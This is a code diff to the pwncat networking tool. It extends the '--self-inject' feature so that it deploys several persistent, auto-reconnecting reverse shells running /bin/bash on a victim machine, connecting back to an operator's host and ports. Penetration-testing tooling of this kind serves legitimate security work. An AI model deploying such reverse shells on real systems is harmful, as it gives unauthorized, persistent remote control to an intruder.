@@ -112,7 +112,7 @@ if os.environ.get("MYPY_CHECK", False):
 
 APPNAME = "pwncat"
 APPREPO = "https://github.com/cytopia/pwncat"
-VERSION = "0.0.20-alpha"
+VERSION = "0.0.21-alpha"
 
 # Default timeout for timeout-based sys.stdin and socket.recv
 TIMEOUT_READ_STDIN = 0.1
@@ -3028,7 +3028,7 @@ class CNCAutoDeploy(CNC):
         recv,  # type: Callable[[], Iterator[str]]
         cmd,  # type: str
         host,  # type: str
-        port,  # type: str
+        ports,  # type: List[int]
     ):
         # type: (...) -> None
         try:
@@ -3043,24 +3043,25 @@ class CNCAutoDeploy(CNC):
         if not self.upload(local_path, remote_path):
             return
         # TODO: Ensure pwncat stays running
-        self.__start_pwncat(remote_path, cmd, host, port)
+        self.__start_pwncat(remote_path, cmd, host, ports)
         return
 
-    def __start_pwncat(self, remote_path, binary, host, port):
-        # type: (str, str, str, str) -> None
-        command = []
-        command.append("nohup")
-        command.append(self.python)
-        command.append(remote_path)
-        command.append("--exec {}".format(binary))
-        command.append("--reconn")
-        command.append("--reconn-wait 1")
-        command.append(host)
-        command.append(port)
-        command.append("&")
-        data = " ".join(command)
-        print("Starting pwncat rev shell: {}".format(data))
-        self.remote_command(data)
+    def __start_pwncat(self, remote_path, binary, host, ports):
+        # type: (str, str, str, List[int]) -> None
+        for port in ports:
+            command = []
+            command.append("nohup")
+            command.append(self.python)
+            command.append(remote_path)
+            command.append(host)
+            command.append(str(port))
+            command.append("--exec {}".format(binary))
+            command.append("--reconn")
+            command.append("--reconn-wait 1")
+            command.append("&")
+            data = " ".join(command)
+            print("Starting pwncat rev shell: {}".format(data))
+            self.remote_command(data)
 
 
 # #################################################################################################
@@ -3609,6 +3610,9 @@ automatically deploy and background-run an unbreakable
 pwncat reverse shell onto the victim machine which then
 also connects back to you with specified arguments.
 Example: '--self-inject /bin/bash:10.0.0.1:4444'
+It is also possible to launch multiple reverse shells.
+Example: '--self-inject /bin/bash:10.0.0.1:4444,4445'
+Example: '--self-inject /bin/bash:10.0.0.1:4444-4450'
 Note: this is currently an experimental feature and does
 not work on Windows remote hosts yet.
 """,
@@ -4073,7 +4077,10 @@ def main():
         # This will hand over to normal listening server on success or failure
         if args.self_inject:
             cnc_cmd, cnc_host, cnc_port = args.self_inject.split(":")
-            CNCAutoDeploy(enc, net.consumer, net.producer, cnc_cmd, cnc_host, cnc_port)
+            cnc_ports = ArgValidator.get_port_list_by_comma(
+                cnc_port
+            ) + ArgValidator.get_port_list_by_range(cnc_port)
+            CNCAutoDeploy(enc, net.consumer, net.producer, cnc_cmd, cnc_host, cnc_ports)
         run = Runner(PSEStore(ssig, [net]))
         run.add_action(
             "RECV",
